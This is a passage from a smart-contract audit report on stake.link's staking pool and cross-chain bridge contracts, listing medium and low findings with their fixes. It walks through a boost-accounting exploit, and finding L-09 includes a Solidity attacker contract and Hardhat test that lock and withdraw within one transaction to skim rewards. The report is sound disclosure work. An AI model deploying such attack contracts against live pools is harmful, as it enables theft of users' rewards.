		...
@>	} else if (boostAmountDiff < 0) {
@>		locks[lockId].expiry = updateLockState.expiry;
@>		locks[lockId].boostAmount = 0;
@>		emit InitiateUnlock(_owner, lockId, updateLockState.expiry);
	} else {
		...
	}
	...
}
...
```

Recall that the attacker only has a single update, with the only difference being the decrease of 50 for the `boostAmount`. This will trigger the logic based on the `boostAmountDiff < 0` statement which will set `locks[lockId].boostAmount = 0`. This is clearly incorrect logic & will allow the attacker to then fraudulently increase `queuedRESDLSupplyChange`, which will ultimately lead to more rewards going to this secondary chain.

Continuing this attack, the attacker will again call `SDLPoolSecondary:extendLockDuration`, but this time with a `_lockingDuration` of 10_000. Referencing the same code snippet as earlier, in `_updateLock`, `boostAmount` is now being calculated as: 100_000 * 5 * 10_000/10_000 = 500_000. In `_queueLockUpdate`, `queuedRESDLSupplyChange` is calculated to be: (100_000 + 500_000) - (100_000 + 0) = 500_000, based on this equation:
```solidity
queuedRESDLSupplyChange +=
	int256(lockUpdate.lock.amount + lockUpdate.lock.boostAmount) -
	int256(lock.amount + lock.boostAmount);
```

Recall that this value of 0 comes from the improper logic in the `_executeQueuedLockUpdates` function call. Ultimately, in aggregate, `queuedRESDLSupplyChange` has been increased by 500_000 - 50 = 499_950. Had the attacker simply increased their locking duration to the max value of 10_000 after the update, there would be 0 change in the `queuedRESDLSupplyChange`.

The fundamental bug here is that post a decrease in `maxBoost`, the update logic allows all existing reSDL NFTs to be able to increase `queuedRESDLSupplyChange` more than should be possible, & `queuedRESDLSupplyChange` is a major factor in terms of the percentage of rewards going to a given secondary chain. 

## Impact

Users with existing reSDL NFTs on secondary chains (prior to a decrease in the `maxBoost`) are able to increase `queuedRESDLSupplyChange` by a greater amount than should be possible given the current `maxBoost` value, which then allows them to funnel more rewards to their secondary chain.

## Tools Used

Manual review

## Recommendations

The `_executeQueuedLockUpdates` function implicitly assumes if there's a decrease in `boostAmountDiff` then the lock update comes from calling `initiateUnlock`. There needs to be an additional case to handle this scenario due to a decrease in the `maxBoost`.

# Low Risk Findings

## <a id='L-01'></a>L-01. SINGLE STEP OWNERSHIP TRANSFER PROCESS

_Submitted by [ubl4nk](/profile/clmknelt80000la08ioq96nnv), [0xTheBlackPanther](/profile/clnca1ftl0000lf08bfytq099), [ihtishamsudo](/profile/clk45qe6f0004la08qheax87s), [ro1sharkm](/profile/clk56pzim0006l508uumuo4oq), [PNS](/profile/clk6oje9c000klc08mp3uprul), [SAAJ](/profile/cllq1yz0u0004ju08019ho5a7), [jauvany](/profile/clon4hmms000ujx08d0u2n6py), [Albahaca](/profile/clptt4clp0006ue37p1gudxbr), [DarkTower ](/team/clmuj4vc00005mo08knfwx1dl). Selected submission by: [ro1sharkm](/profile/clk56pzim0006l508uumuo4oq)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/ccip/RESDLTokenBridge.sol#L6

## Summary
The ownership of the contracts can be lost as the contracts  inherits from the Ownable contract and their ownership can be transferred
in a single-step process.  If the nominated EOA account is not a valid account, it is entirely possible that the owner may accidentally transfer ownership to
an uncontrolled account, losing the access to all functions with the `onlyOwner` modifier. The address the ownership is changed to should be verified to be active or willing to act as the owner

Contracts affected:

SDLPoolCCIPController.sol

RESDLTokenBridge.sol

WrappedTokenBridge

LinearBoostController

RewardsInitiator 

## Tools Used
Manual Analysis
## Recommendations
Consider using the `Ownable2Step` library over the Ownable library or implementing similar two-step ownership transfer logic into the contract
## <a id='L-02'></a>L-02. CCIP router address cannot be updated

_Submitted by [Team Penaldo](/team/clql5iu8m0001pygqjd19s92o)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/ccip/SDLPoolCCIPControllerPrimary.sol

https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/ccip/SDLPoolCCIPControllerSecondary.sol

https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/ccip/WrappedTokenBridge.sol

https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/ccip/base/SDLPoolCCIPController.sol

## Summary

CCIP Router addresses cannot be updated in `SDLPoolCCIPController.sol, SDLPoolCCIPControllerPrimary.sol, SDLPoolCCIPControllerSecondary.sol, WrappedTokenBridge.sol` . 

## Vulnerability Details

On contracts that inherit from `CCIPReceiver`, router addresses need to be updateable. Chainlink may update the router addresses as they did before. This issue introduces a single point of failure that is outside of the protocol's control.

[An example contract](https://github.com/smartcontractkit/ccip-tic-tac-toe/blob/main/contracts/TTTDemo.sol#L81-L83) that uses CCIP. [Taken from Chainlink docs](https://docs.chain.link/ccip/examples#ccip-tic-tac-toe).

[Chainlink documents noticing users about router address updating on testnet.](https://docs.chain.link/ccip/release-notes#v120-release-on-testnet---2023-12-08)

> CCIP v1.0.0 has been deprecated on testnet. You must use the new router addresses mentioned in the [CCIP v1.2.0 configuration page](https://docs.chain.link/ccip/supported-networks/v1_2_0/testnet) **before January 31st, 2024**
> 

On Testnets, router contracts in v1.0.0 and v1.2.0 are different. It means that router contract addresses can change from version to version. So CCIPReceivers should accommodate this. Mainnet is on v1.0.0 which means its router addresses can change with an update.

## Impact

Impact: High
Likelihood: Low

Router address deprecation will cause the protocol to stop working.

## Tools Used

Manual review.

## Recommendations

Implement a function to update the `_router` address. Example shown below:

```jsx
function updateRouter(address routerAddr) external onlyOwner {
        _router = routerAddr;
    }
```


## <a id='L-03'></a>L-03. Accidental `renounceOwnership()` call can disrupt key operations in multiple contracts.

_Submitted by [Tigerfrake](/profile/clqqa49xg0006sjy9t2ly5s3p), [cartlex](/profile/clmmjt9x10000l8085ebqdq7p), [ro1sharkm](/profile/clk56pzim0006l508uumuo4oq), [The Seraphs](/team/clqhydutl0005v5vlsy3t79wm). Selected submission by: [The Seraphs](/team/clqhydutl0005v5vlsy3t79wm)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/ccip/RESDLTokenBridge.sol#L16C1-L16C39

https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/ccip/SDLPoolCCIPControllerPrimary.sol#L11C1-L11C65

https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/ccip/SDLPoolCCIPControllerSecondary.sol#L14C1-L14C67

https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/ccip/WrappedTokenBridge.sol#L19C1-L19C55

https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/sdlPool/LinearBoostController.sol#L10C1-L10C44

## Title
Accidental `renounceOwnership()` call can disrupt key operations in multiple contracts.

## Severity
Medium

## Relevant GitHub Links
1. https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/ccip/RESDLTokenBridge.sol#L16C1-L16C39
2. https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/ccip/SDLPoolCCIPControllerPrimary.sol#L11C1-L11C65
3. https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/ccip/SDLPoolCCIPControllerSecondary.sol#L14C1-L14C67
4. https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/ccip/WrappedTokenBridge.sol#L19C1-L19C55
5. https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/sdlPool/LinearBoostController.sol#L10C1-L10C44

## Summary
`Ownable` contains a function named `renounceOwnership()` which can be used to remove the ownership of contracts in a protocol.

This can lead to `SDLPoolCCIPControllerPrimary`, `SDLPoolCCIPControllerPrimary`, `WrappedTokenBridge`, `LinearBoostController` and `RESDLTokenBridge` contracts becoming disowned, which will then break critical functions of the protocol.

## Vulnerability Details
The `WrappedTokenBridge`, `LinearBoostController` and `RESDLTokenBridge` contracts inherit from `Ownable`, `SDLPoolCCIPControllerPrimary` from `SDLPoolCCIPController` which inherits `Ownable`, and `SDLPoolCCIPControllerSecondary` inherits from SDLPoolCCIPControllerPrimary; and hence inherit `renounceOwnership()` function.

The owner could accidentally (or intentionally) call `renounceOwnership()` which transfers ownership to `address(0)`. This will break numerous functions within each contract referenced that has the `onlyOwner()` modifier assigned. Below are a list of those functions:

**`SDLPoolCCIPControllerPrimary`**
- `setRewardsInitiator()`
- `setWrappedRewardToken()`
- `approveRewardTokens()`
- `removeWhitelistedChain()`
- `addWhitelistedChain()`

**`SDLPoolCCIPControllerSecondary`**
- `setExtraArgs()`

**`WrappedTokenBridge`**
- `recoverTokens()`
- `transferTokens()`

**`LinearBoostController`**
- `setMaxLockingDuration()`
- `setMaxBoost()`

**`RESDLTokenBridge`.**
- `setExtraArgs()`

## POC
Add this test to `test/core/ccip/sdl-pool-ccip-controller-primary.test.ts`
```json
 it.only('renounce ownership', async () => {
    console.log("Owner before", await controller.owner())
    // set max link fee
    await controller.setMaxLINKFee(toEther(100))
    // console out the max link fee
    console.log("Set max link fee with onlyOwner modifier", await controller.maxLINKFee())
    
    // renounce ownership using renounceOwnership() from owner contract
    await expect(controller.renounceOwnership())
    // set max link fee and expect revert
    await expect(controller.setMaxLINKFee(toEther(200))).to.be.revertedWith('Ownable: caller is not the owner')
    // console out the max link fee
    console.log("set max link fee hasn't changed", await controller.maxLINKFee())
    // console out the owner
    console.log("Owner after", await controller.owner())
 
  })
```

## Tools Used
Manual Review

## Recommendations
Disable `renounceOwnership()` if function in the Ownable contract not required.

```diff
+ function renounceOwnership() public override onlyOwner {
+     revert ("Not allowed");
+ }
```
## <a id='L-04'></a>L-04. Insufficient Gas Limit Specification for Cross-Chain Transfers in _buildCCIPMessage() method. WrappedTokenBridge.sol #210

_Submitted by [0xTheBlackPanther](/profile/clnca1ftl0000lf08bfytq099), [IceBear](/profile/cllnrqkdu0008lc08luxl02vh), [NoodleDonn212](/profile/clk5fl9ea0002jx088dbcok71), [naruto](/profile/clphrx1k300003i3mv5qmh2t9), [innertia](/profile/clkqyrmqu000gkz08274w833n), [Draiakoo](/profile/clk3xadrc0020l808t9unuqkr), [chainNue](/profile/clkceb0jn000ol8082eekhkg8), [Fondevs](/profile/clkrnxc3b000gl70879sx2swb). Selected submission by: [NoodleDonn212](/profile/clk5fl9ea0002jx088dbcok71)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/ccip/WrappedTokenBridge.sol#L157

https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/ccip/WrappedTokenBridge.sol#L210

## Summary
The _buildCCIPMessage() function in the WrappedTokenBridge contract does not specify a gasLimit for the execution of the ccipReceive() function on the destination blockchain. This omission can lead to unpredictable gas costs and potential failure of the message processing due to out-of-gas errors.

## Vulnerability Details
The Client.EVM2AnyMessage struct created by _buildCCIPMessage() is used to define the details of a cross-chain message, including the tokens to be transferred and the receiver's address. However, the struct lacks a gasLimit field in the extraArgs, which is crucial for determining the maximum amount of gas that can be consumed when the ccipReceive() function is called on the destination chain.

Without a specified gasLimit, the default gas limit set by the CCIP router or the destination chain's infrastructure is used. This default may not align with the actual gas requirements of the ccipReceive() function, potentially leading to failed transactions or higher-than-expected fees.

`
function _buildCCIPMessage(
        address _receiver,
        uint256 _amount,
        address _feeTokenAddress
    ) internal view returns (Client.EVM2AnyMessage memory) {
        Client.EVMTokenAmount[] memory tokenAmounts = new Client.EVMTokenAmount[](1);
        Client.EVMTokenAmount memory tokenAmount = Client.EVMTokenAmount({token: address(wrappedToken), amount: _amount});
        tokenAmounts[0] = tokenAmount;

        Client.EVM2AnyMessage memory evm2AnyMessage = Client.EVM2AnyMessage({
            receiver: abi.encode(_receiver),
            data: "",
            tokenAmounts: tokenAmounts,
            extraArgs: "0x",
            feeToken: _feeTokenAddress
        });

        return evm2AnyMessage;
    }
`

## Impact
If the default gas limit is too low, the ccipReceive() function may run out of gas, causing the transaction to fail on the destination chain.

Without a specified gasLimit, the cost of sending a message can vary, making it difficult for users to predict the required fees.

 If the default gas limit is higher than necessary, users may overpay for gas that is not used, as unspent gas is not refunded.

## Tools Used
Manual inspection.

https://docs.chain.link/ccip/best-practices
..Gas Limit

CCIP Lending example. sendMessage()
https://github.com/smartcontractkit/ccip-defi-lending/blob/main/contracts/Protocol.sol#170

## Recommendations

To address the issue of not including a gasLimit in the _transferTokens method, we can take inspiration from the sendMessage() example and modify the _buildCCIPMessage function within the WrappedTokenBridge contract to include a gasLimit in the extraArgs field of the EVM2AnyMessage struct. This will ensure that the CCIP message sent to the destination blockchain includes a specified maximum amount of gas that can be consumed during the execution of the ccipReceive() function.

function _buildCCIPMessage(
    address _receiver,
    uint256 _amount,
    address _feeTokenAddress
) internal view returns (Client.EVM2AnyMessage memory) {
    Client.EVMTokenAmount[] memory tokenAmounts = new Client.EVMTokenAmount[](1);
    Client.EVMTokenAmount memory tokenAmount = Client.EVMTokenAmount({
        token: address(wrappedToken),
        amount: _amount
    });
    tokenAmounts[0] = tokenAmount;

    
    
//  // Include a gasLimit in the extraArgs 
    Client.EVM2AnyMessage memory evm2AnyMessage = Client.EVM2AnyMessage({
        receiver: abi.encode(_receiver),
        data: "",
        tokenAmounts: tokenAmounts,
        extraArgs:  Client._argsToBytes(
        Client.EVMExtraArgsV1({gasLimit: 200_000, strict: false}) // Additional arguments, setting gas limit and non-strict sequency mode
      ),
        feeToken: _feeTokenAddress
    });

    return evm2AnyMessage;
}



Includes a gasLimit field, which is set to 200,000 in this example. This value should be adjusted based on the expected gas consumption of the ccipReceive() function on the destination chain.
By including the gasLimit in the extraArgs, you ensure that the CCIP message has a specified maximum gas limit for execution, which can prevent out-of-gas errors and control the cost of the cross-chain transfer.
## <a id='L-05'></a>L-05. No validation for `_amount` in migrate function

_Submitted by [0xTheBlackPanther](/profile/clnca1ftl0000lf08bfytq099)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/sdlPool/SDLPoolPrimary.sol#L264-L272

## Summary

In the `SDLPoolPrimary` contract, the `migrate` function lacks a validation check for the `_amount` parameter. When `_amount` is zero, indicating that no SDL tokens are being staked or migrated, a lock with zero value is created. This could lead to unintended consequences, as creating locks with zero value may not align with the intended behavior of the contract. Implementing a check for non-zero values in `_amount` is recommended to prevent the creation of zero-value locks during migration.

## Vulnerability Details

In the `migrate` function, there is no explicit check for zero values in the `_amount` parameter. Consequently, when zero is passed as the _amount during migration, a lock with zero value is created. While this does not cause a revert, it might lead to unintended consequences, such as the creation of zero-value locks and potential resource allocation for these locks.

## Impact

Allowing zero values in the `_amount` parameter during migration can lead to the creation of zero-value locks, posing risks such as unnecessary gas costs, increased complexity in auditing and contract comprehension, and potential resource allocation for zero-value locks.

## Tools Used

Manual review

## Recommendations

Implement a check at the beginning of the migrate function to ensure that `_amount` is greater than zero. This can prevent the creation of zero-value locks.

```
if (_amount == 0) revert NonZeroAmountRequired();
```
## <a id='L-06'></a>L-06. Lack of storage gap in SDLPool.sol can lead to upgrade storage slot collision.

_Submitted by [kaysoft](/profile/clkig5ndy001cmh08vf2kbcem), [larsson](/profile/clk7vllab0004l708xag2q0in), [djanerch](/profile/clkv0whr4000wl608y1s0p7o4), [IceBear](/profile/cllnrqkdu0008lc08luxl02vh), [naruto](/profile/clphrx1k300003i3mv5qmh2t9), [0xMilenov](/profile/clkft21x40000ju08bdx6217s), [ro1sharkm](/profile/clk56pzim0006l508uumuo4oq), [0x6980](/profile/cllkfri9u0000mc082h22s645), [SAAJ](/profile/cllq1yz0u0004ju08019ho5a7), [innertia](/profile/clkqyrmqu000gkz08274w833n). Selected submission by: [kaysoft](/profile/clkig5ndy001cmh08vf2kbcem)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/sdlPool/base/SDLPool.sol#L15C1-L527C2

## Summary
`SDLPool.sol` is an upgradable contract with storage variables and it has  child contracts `SDLPoolPrimary.sol` and `SDLPoolSecondary.sol` but does not have storage gaps implemented.

see storage gaps here: https://docs.openzeppelin.com/contracts/3.x/upgradeable#storage_gaps


## Vulnerability Details
`SDLPool.sol` is an upgradable contract with storage variables and it has  child contracts `SDLPoolPrimary.sol` and `SDLPoolSecondary.sol`. All are meant to be upgradeable which means new functions and storage variables can be added to the `SDLPool.sol` contract. However, if a new storage variable is added to `SDLPool.sol` , it will overwrite the storage of the children contract `SDLPoolPrimary.sol` and `SDLPoolSecondary.sol`.

## Impact
When there is a need to upgrade `SDLPool.sol` with a new storage variable, storage collision can occur with the child contracts `SDLPoolPrimary.sol` and `SDLPoolSecondary.sol`.

## Tools Used
Manual Review

## Recommendations
Add storage gaps to the `SDLPool.sol` contract to allow easy upgrade.
## <a id='L-07'></a>L-07. Fee Calculation inconsistency in WrappedTokenBridge

_Submitted by [touqeershah32](/profile/clk4j5bsv001kmh08tgcwblsm), [holydevoti0n](/profile/clk82nj2x001mm9087waeah19), [Draiakoo](/profile/clk3xadrc0020l808t9unuqkr). Selected submission by: [holydevoti0n](/profile/clk82nj2x001mm9087waeah19)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/ccip/WrappedTokenBridge.sol#L126-L132

## Summary
The WrappedTokenBridge contract exhibits a critical issue in its fee calculation logic. Specifically, the getFee function uses a hardcoded value of `1000 ether`, leading to potentially incorrect fee assessments for CCIP transfers. As the router from chainlink also accounts for the amount of tokens to determine the charged fee.


## Vulnerability Details
The problem lies in the getFee function where it constructs a Client.EVM2AnyMessage with a hardcoded `1000 ether` amount. This approach does not accurately reflect the dynamic nature of fee calculations, which should consider the actual amount of tokens being transferred.
```
        Client.EVM2AnyMessage memory evm2AnyMessage = _buildCCIPMessage(
            address(this),
            1000 ether,
            _payNative ? address(0) : address(linkToken)
        );


        return IRouterClient(this.getRouter()).getFee(_destinationChainSelector, evm2AnyMessage);
```

## Impact
This hardcoded value can result in incorrect fee estimations, potentially leading to overcharging or undercharging users for CCIP transfers. This issue undermines the reliability and trustworthiness of the fee assessment mechanism in the contract.

## Tools Used
Manual Review

## Recommendations
Revise the getFee function to dynamically calculate fees based on the actual token amount being transferred. Ensure that the fee computation aligns with the varying amounts and conditions of each transfer, providing an accurate and fair fee estimation for users.
## <a id='L-08'></a>L-08. WrappedTokenBridge#recoverTokens will drain the whole token balance

_Submitted by [aslanbek](/profile/clk49k0iz0000me08szp3rh89), [0xSwahili](/profile/clkkxnjij0000m808ykz18zsc). Selected submission by: [aslanbek](/profile/clk49k0iz0000me08szp3rh89)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/ccip/WrappedTokenBridge.sol#L140-L147

## Summary
`recoverTokens` is supposed to retrieve tokens accidentally sent to the contract. However, if this function is called to recover the bridge's `token`, `wrappedToken`, or `LINK`, it will drain the whole balance of the contract, instead of just the amount that was sent by mistake.

## Impact
Bridge's token balance would be drained.

## Recommendations
Either add the amount to recover as a function parameter, or disable recovery of these tokens.
## <a id='L-09'></a>L-09. Can lock Fund for 1 sec and unlock in same transaction to gain profit

_Submitted by [TorpedopistolIxc41](/profile/clk5ki3ah0000jq08yaeho8g7), [innertia](/profile/clkqyrmqu000gkz08274w833n), [Draiakoo](/profile/clk3xadrc0020l808t9unuqkr), [happyformerlawyer](/profile/clmca6fy60000mp08og4j1koc). Selected submission by: [TorpedopistolIxc41](/profile/clk5ki3ah0000jq08yaeho8g7)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/sdlPool/SDLPoolPrimary.sol#L107C4-L122C1

## Summary

Can lock Fund for 1 sec and unlock in same transaction to gain profit even if it's small amount yet there's no flashloan protection so malicious user can flashloan big amount and sandwich the rebasing upkeep to take advantage of the pool with dividing leads to zero problem to gain profit from pool.This way totalstaked amount can be manupilated. Checkupkeep and performUkeep completely user accessible so totalstake amount can change for the favor of malicious user
<details>
  <summary style="font-weight: bold; cursor: pointer;">Click to see Attack contract</summary>
  
  <p style="margin-left: 20px;">

```

// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;
import{IERC677Receiver} from "../core/interfaces/IERC677Receiver.sol";
import{IERC721Receiver} from "../core/interfaces/IERC721Receiver.sol";
import{IERC677} from "../core/interfaces/IERC677.sol";
import{SDLPoolPrimary} from "../core/sdlPool/SDLPoolPrimary.sol";

interface IRESDLTokenBridge{
    function transferRESDL(
        uint64 _destinationChainSelector,
        address _receiver,
        uint256 _tokenId,
        bool _payNative,
        uint256 _maxLINKFee
    ) external payable returns (bytes32 messageId);
}

contract Attacker is IERC677Receiver{
       struct Data {
        address operator;
        address from;
        uint256 tokenId;
        bytes data;
    }
    SDLPoolPrimary public sdlPool;
    IRESDLTokenBridge public tokenBridge;
    IERC677 public sdlToken;
    uint256 public latestLockId;
    uint256 public totalRewards;
    Data[] private data;
    bool public received;
    constructor(address _sdlPool,address _tokenBridge,address _sdlToken)payable{
     sdlPool=SDLPoolPrimary(_sdlPool);
     tokenBridge=IRESDLTokenBridge(_tokenBridge);
     sdlToken=IERC677(_sdlToken);
    }
    function getData() external view returns (Data[] memory) {
        return data;
    }

    function onERC721Received(
        address _operator,
        address _from,
        uint256 _tokenId,
        bytes calldata _data
    ) external returns (bytes4) {
        data.push(Data(_operator, _from, _tokenId, _data));
        received=true;
        return this.onERC721Received.selector;
    }
   

    //@audit in all 1 transaction  u can lock-initiateunlock-withdraw thanks to 
    //@audit rounddown to zero...
    function attackTransfernCall() public payable{
     sdlToken.transferAndCall(address(sdlPool),200 ether ,abi.encode(uint256(0), uint64(1)));
     sdlPool.initiateUnlock(getLockId());
     sdlPool.withdraw(getLockId(),200 ether);
    } 

     function attackCcipTransfer() public payable{
       tokenBridge.transferRESDL{value:15 ether}(77,address(this),getLockId(),true,15 ether);
    } 

    function onTokenTransfer(
        address,
        uint256 _value,
        bytes calldata
    ) external virtual {
        totalRewards += _value;
    }
function getLockId()public view returns(uint256){
uint256[] memory lockIDs= new uint256[](1);
lockIDs=sdlPool.getLockIdsByOwner(address(this));
    return lockIDs[0];
}
    receive() external payable{

    
      }
    }
}
``` 
</p>
  
 
</details>
test case for hardhat(same test suit provided by Protocol)
run with 

```
npx hardhat test --network hardhat --grep 'usage of Attack contract and receiving NFT'

```

```
 import { Signer } from 'ethers'
import { assert, expect } from 'chai'
import {
  toEther,
  deploy,
  getAccounts,
  setupToken,
  fromEther,
  deployUpgradeable,
} from '../../utils/helpers'
import {
  ERC677,
  LinearBoostController,
  RewardsPool,
  SDLPoolPrimary,
  StakingAllowance,
  Attacker
} from '../../../typechain-types'
import { ethers } from 'hardhat'
import { time } from '@nomicfoundation/hardhat-network-helpers'
//1 day in seconds...
const DAY = 86400

// parsing Lock struct in contracts...
const parseLocks = (locks: any) =>
  locks.map((l: any) => ({
    amount: fromEther(l.amount),
    //show 4 digits after decimal...
    boostAmount: Number(fromEther(l.boostAmount).toFixed(10)),
    startTime: l.startTime.toNumber(),
    duration: l.duration.toNumber(),
    expiry: l.expiry.toNumber(),
  }))

  const parseData=(data:any)=>({
    operator:data.operator,
    from:data.from,
    tokenId:data.tokenId,
    data: Buffer.from(data.data.slice(2), 'hex').toString('utf8')
  })

describe('SDLPoolPrimary', () => {
  let sdlToken: StakingAllowance
  let rewardToken: ERC677
  let rewardsPool: RewardsPool
  let boostController: LinearBoostController
  let sdlPool: SDLPoolPrimary
  let signers: Signer[]
  let accounts: string[]
  let attacker:Attacker
  before(async () => {
    ;({ signers, accounts } = await getAccounts())
  })

  beforeEach(async () => {
    sdlToken = (await deploy('StakingAllowance', ['stake.link', 'SDL'])) as StakingAllowance
    rewardToken = (await deploy('ERC677', ['Chainlink', 'LINK', 1000000000])) as ERC677

    await sdlToken.mint(accounts[0], toEther(1000000))
    await setupToken(sdlToken, accounts)

    boostController = (await deploy('LinearBoostController', [
      4 * 365 * DAY,
      4,
    ])) as LinearBoostController

    sdlPool = (await deployUpgradeable('SDLPoolPrimary', [
      'Reward Escrowed SDL',
      'reSDL',
      sdlToken.address,
      boostController.address,
    ])) as SDLPoolPrimary

    rewardsPool = (await deploy('RewardsPool', [
      sdlPool.address,
      rewardToken.address,
    ])) as RewardsPool

    await sdlPool.addToken(rewardToken.address, rewardsPool.address)
    await sdlPool.setCCIPController(accounts[0])
    //attack contract deployment -- setting bridge contract to same we wont need ccip here
    attacker=await deploy("Attacker",[sdlPool.address,sdlPool.address,sdlToken.address]) as Attacker
    await sdlToken.transfer(attacker.address,toEther(20000))
    const sender = signers[0] // or choose any unlocked account
    const valueToSend = ethers.utils.parseEther("100") // Amount of Ether to send
    const tx = await sender.sendTransaction({
      to: attacker.address,
      value: valueToSend,
    });
  
    await tx.wait();
    console.log("Funded contract!");
  })
  it('should be able to lock an existing stake', async () => {
    //with flashloan this may prove fatal...
    await sdlToken.transferAndCall(
      sdlPool.address,
      toEther(10000),
      ethers.utils.defaultAbiCoder.encode(['uint256', 'uint64'], [0, 0])
    )
    await sdlPool.extendLockDuration(1, 365 * DAY)
    let ts = (await ethers.provider.getBlock(await ethers.provider.getBlockNumber())).timestamp

    assert.equal(fromEther(await sdlPool.totalEffectiveBalance()), 200)
    assert.equal(fromEther(await sdlPool.totalStaked()), 200)
    assert.equal(fromEther(await sdlPool.effectiveBalanceOf(accounts[0])), 200)
    assert.equal(fromEther(await sdlPool.staked(accounts[0])), 200)
    assert.deepEqual(parseLocks(await sdlPool.getLocks([1])), [
      { amount: 100, boostAmount: 100, startTime: ts, duration: 365 * DAY, expiry: 0 },
    ])

    // Move one block forward
  //await ethers.provider.send('evm_mine', []);
  //console.log("Parsed lock :",parseLocks(await sdlPool.getLocks([1])))
  })
  //@audit NFT onERC721receiver doesnt work it seems..
  it('usage of Attack contract and receiving NFT', async () => {
  console.log("Block-number before tx:",await ethers.provider.getBlockNumber())
  let ts = (await ethers.provider.getBlock(await ethers.provider.getBlockNumber())).timestamp
          // Move one block forward
  await ethers.provider.send('evm_mine', [ts+1]);
  console.log("SDLToken  balance Before:",await sdlToken.balanceOf(attacker.address))
  await attacker.attackTransfernCall()
  console.log("Lock",parseLocks(await sdlPool.getLocks([1])))
  console.log("Block-number after tx:",await ethers.provider.getBlockNumber())
  console.log("Nft received ??:",await attacker.received());
//boostAmount: 0.0006341958 20_000 -> with flashloan
//boostAmount: 0.000006342  200  
  })
})

```

## Impact
Loss of pool reward gained by rebasing.
## Tools Used

Hardhat-manuel review

## Recommendations

Setting lower-limit of locking time to stop bypassing 1 transaction lock-unlock-withdraw .This way it might stop the flashloan attacks too.
Preferable  minimum 1 day.
## <a id='L-10'></a>L-10. No Check for Transferring to Self

_Submitted by [Wish](/profile/clqivzpn10000roxk5051p0t2), [crippie](/profile/clkitmhs50000l508e5tvl2w2), [0xHackerNight](/profile/cln0hezsl0008jt096eepzvj9). Selected submission by: [Wish](/profile/clqivzpn10000roxk5051p0t2)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-12-stake-link/tree/main/contracts/core/sdlPool/base/SDLPool.sol#L460-462

## Summary

The `_transfer` function is responsible for transferring the ownership of a lock from one address to another. It is a critical part of the ERC721 token standard implementation, which this contract adheres to. However, there is a missing check to ensure that the `_from` address is not the same as the `_to` address. Transferring a lock where the `_from` and `_to` addresses are the same can lead to unintended consequences like the double changing of state variables.

Since the _updateRewards function logic depends on the rewards pool, this could create an exploit depending on the implementation of the rewards pool. 

By adding this check, we can ensure that locks are not transferred to the same address that already owns them, thus mitigating the described vulnerability.

## Recommendations

Add a check to the _transfer function to ensure that `_from` != `_to`.
## <a id='L-11'></a>L-11. Audit Report for SDLPool.sol - Scalability Concern

_Submitted by [Wish](/profile/clqivzpn10000roxk5051p0t2), [OrderSol](/profile/clqm6zqrr0002su3kixltcau1), [crippie](/profile/clkitmhs50000l508e5tvl2w2), [tychaios](/profile/clllk3iz80000jt08og98fzdl), [0xMilenov](/profile/clkft21x40000ju08bdx6217s), [0xbepresent](/profile/clk8nnlbx000oml080k0lz7iy). Selected submission by: [tychaios](/profile/clllk3iz80000jt08og98fzdl)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/sdlPool/base/SDLPool.sol#L177

## Summary

This report highlights a potential scalability issue in the `SDLPool.sol` smart contract, specifically within the `getLockIdsByOwner` function. The current storage and retrieval method for lock IDs will become increasingly expensive over time.

## Vulnerability Details

In `SDLPool.sol:177`, the `getLockIdsByOwner` function iterates through all lock IDs from 1 to `lastLockId` to determine which locks belong to a specific owner. This approach, while functional, becomes inefficient as the number of lock IDs grows, leading to increased gas costs and slower execution times.

## Impact

The linear search methodology employed in the function poses the following risks:

1. **High Gas Costs**: As the `lastLockId` increases, the cost of iterating through all lock IDs grows, resulting in expensive read operations.
2. **Scalability Issues**: The function's performance degrades over time as the dataset grows, potentially making it impractical or too costly to use in the long term.
3. **Reduced User Experience**: Slower execution times and higher costs can negatively impact the user experience, especially for accounts with a large number of locks.

